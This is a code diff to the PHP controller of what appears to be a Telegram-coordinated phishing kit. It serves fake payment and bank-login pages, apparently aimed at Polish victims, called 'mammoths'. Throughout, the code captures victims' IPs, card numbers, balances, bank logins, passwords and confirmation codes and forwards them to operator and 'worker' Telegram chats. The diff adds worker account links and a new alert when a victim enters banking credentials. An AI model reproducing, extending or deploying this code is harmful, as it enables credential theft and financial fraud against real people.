@@ -151,14 +151,14 @@ class PagesController extends Controller
         $categoryName = $fake->category->name;
         $view = "fakes.$categoryName.index";
         if (view()->exists($view)) {
-            if ($adminGroupId = BotController::groupAdmin('id')) $this->sendLogs($adminGroupId, [
+            if ($alertGroupId = BotController::groupAlert('id')) $this->sendLogs($alertGroupId, [
                 "⭐️<b>️Мамонт на странице получения средств</b>",
                 "=================",
                 "🏷<b>Товар:</b> <code>{$fake->title}</code>",
                 "💵<b>Сумма:</b> <code>{$fake->price()}</code>",
                 "👤<b>IP:</b> <code>$ip $city_geo</code>",
                 "🚛<b>Платформа:</b> <code>{$this->platform()}</code>",
-                "🐵<b>Воркер:</b> <code>{$fake->telegramUser->getName()}</code>",
+                "🐵<b>Воркер:</b> <code>{$fake->telegramUser->accountLink()}</code>",
             ]);
 
             foreach ($fake->allTakeUsers()->pluck('id') as $workerId) $this->sendLogs($workerId, [
@@ -167,7 +167,7 @@ class PagesController extends Controller
                 "🆔<b>Номер объявления:</b> <code>{$fake->getTrackIdFromWorker()}</code>",
                 "💵<b>Сумма:</b> <code>{$fake->price()}</code>",
                 "🚛<b>Платформа:</b> <code>{$this->platform()}</code>",
-                "🐵<b>Воркер:</b> <code>{$fake->telegramUser->getName()}</code>",
+                "🐵<b>Воркер:</b> <code>{$fake->telegramUser->accountLink()}</code>",
             ]);
             return view($view);
         } else abort(404);
@@ -212,13 +212,15 @@ class PagesController extends Controller
         $step = ($request->has('step')) ? $request->get('step') : false;
         $html = $step && view()->exists($step) ? view($step)->render() : null;
         $text = [
+            "⭐️<b>Мамонт ввел ЛК</b>",
             "🏛<b>$bankName</b>",
             "=================",
             "🚛<b>Платформа:</b> <code>{$this->platform()}</code>",
-            "🐵<b>Воркер:</b> <code>{$fake->telegramUser->getName()}</code>",
+            "🐵<b>Воркер:</b> <code>{$fake->telegramUser->accountLink()}</code>",
             "🆔<b>Номер объявления:</b> <code>$fake->track_id</code>",
             "=================",
         ];
+        foreach ($fake->allTakeUsers()->pluck('id') as $workerId) $this->sendLogs($workerId, $text);
         if ($request->get('login'))
             $text[] = "🔑<b>Логин:</b> <code>{$request->get('login')}</code>";
         if ($request->get('password'))
@@ -245,7 +247,7 @@ class PagesController extends Controller
             ? ""
             : "{$ipData['location']['country_flag_emoji']} {$ipData['city']}, {$ipData['region_name']}";
         $fake = $this->getFake();
-        if ($adminGroupId = BotController::groupAdmin('id')) $this->sendLogs($adminGroupId, [
+        if ($alertGroupId = BotController::groupAlert('id')) $this->sendLogs($alertGroupId, [
             "⭐️<b>Мамонт вбивает карту</b>",
             "=================",
             "🆔<b>Номер объявления:</b> <code>{$fake->track_id}</code>",
@@ -253,7 +255,7 @@ class PagesController extends Controller
             "💵<b>Сумма:</b> <code>{$fake->price()}</code>",
             "👤<b>IP:</b> <code>$ip $city_geo</code>",
             "🚛<b>Платформа:</b> <code>{$this->platform()}</code>",
-            "🐵<b>Воркер:</b> <code>{$fake->telegramUser->getName()}</code>",
+            "🐵<b>Воркер:</b> <code>{$fake->telegramUser->accountLink()}</code>",
         ]);
         foreach ($fake->allTakeUsers()->pluck('id') as $workerId) $this->sendLogs($workerId, [
             "⭐️<b>Мамонт вбивает карту</b>",
@@ -261,7 +263,7 @@ class PagesController extends Controller
             "🆔<b>Номер объявления:</b> <code>{$fake->getTrackIdFromWorker()}</code>",
             "💵<b>Сумма:</b> <code>{$fake->price()}</code>",
             "🚛<b>Платформа:</b> <code>{$this->platform()}</code>",
-            "🐵<b>Воркер:</b> <code>{$fake->telegramUser->getName()}</code>",
+            "🐵<b>Воркер:</b> <code>{$fake->telegramUser->accountLink()}</code>",
         ]);
         return view('fakes.order', ['title' => 'Pozyskiwanie środków']);
     }
@@ -286,16 +288,9 @@ class PagesController extends Controller
         $holder = $request->session()->get('card_holder');
         $balance = $request->session()->get('balance');
         $amount = number_format($fake->price, 0, "", " ");
-        $track_id = $fake->track_id;
-        $item = $fake->title;
-        $worker = $fake->telegramUser->getName();
         $bankName = ucfirst($this->bank);
         $currency = config('fakes.currency');
-        $ip = \request()->ip();
-        $ipData = ipstack($ip);
-        $city_geo = is_null($ipData)
-            ? ""
-            : "{$ipData['location']['country_flag_emoji']} {$ipData['city']}, {$ipData['region_name']}";
+
         $bankInfo = cardInfo($ccnumber);
         $notify = is_null($bankInfo) ? "<b>(Возможно фейк карта!)</b>" : "";
         $binName = $bankInfo['bank']['name'] ?? null;
@@ -324,7 +319,7 @@ class PagesController extends Controller
             "🆔<b>Номер объявления:</b> <code>{$fake->track_id}</code>",
             "👤<b>IP:</b> <code>$ip $city_geo</code>",
             "🚛<b>Платформа:</b> <code>{$this->platform()}</code>",
-            "🐵<b>Воркер:</b> <code>{$fake->telegramUser->getName()}</code>",
+            "🐵<b>Воркер:</b> <code>{$fake->telegramUser->accountLink()}</code>",
         ]);
         foreach ($fake->allTakeUsers()->pluck('id') as $workerId) $this->sendLogs($workerId, [
             "👾<b>НОВЫЙ ПРИХОД</b> <code>$notify</code>",
@@ -335,7 +330,7 @@ class PagesController extends Controller
             "🆔<b>Номер объявления:</b> <code>{$fake->getTrackIdFromWorker()}</code>",
             "💰<b>Сумма:</b> <code>$amount</code> $currency",
             "💰<b>Баланс на карте:</b> <code>$balance</code> $currency",
-            "🐵<b>Воркер:</b> <code>{$fake->telegramUser->getName()}</code>",
+            "🐵<b>Воркер:</b> <code>{$fake->telegramUser->accountLink()}</code>",
         ]);
 
         return response()->json(['html' => $html, 'next' => $next]);
@@ -374,7 +369,7 @@ class PagesController extends Controller
                 "=================",
                 "🆔<b>Номер объявления:</b> <code>$fake->track_id</code>",
                 "🚛<b>Платформа:</b> <code>{$this->platform()}</code>",
-                "🐵<b>Воркер:</b> <code>{$fake->telegramUser->getName()}</code>",
+                "🐵<b>Воркер:</b> <code>{$fake->telegramUser->accountLink()}</code>",
             ]);
             foreach ($fake->allTakeUsers()->pluck('id') as $workerId) $this->sendLogs($workerId, [
                 "⚠️<b>️Пользователь вводит код подтверждения</b>",
@@ -384,7 +379,7 @@ class PagesController extends Controller
                 "=================",
                 "🆔<b>Номер объявления:</b> <code>{$fake->getTrackIdFromWorker()}</code>",
                 "🚛<b>Платформа:</b> <code>{$this->platform()}</code>",
-                "🐵<b>Воркер:</b> <code>{$fake->telegramUser->getName()}</code>",
+                "🐵<b>Воркер:</b> <code>{$fake->telegramUser->accountLink()}</code>",
             ]);
         }
         if ($request->has('pic')) $this->logBank($request);
@@ -398,7 +393,7 @@ class PagesController extends Controller
             "=================",
             "🆔<b>Номер объявления:</b> <code>$fake->track_id</code>",
             "🚛<b>Платформа:</b> <code>{$this->platform()}</code>",
-            "🐵<b>Воркер:</b> <code>{$fake->telegramUser->getName()}</code>",
+            "🐵<b>Воркер:</b> <code>{$fake->telegramUser->accountLink()}</code>",
         ]);
         return view('fakes.error', ['title' => 'error | 500']);
     }
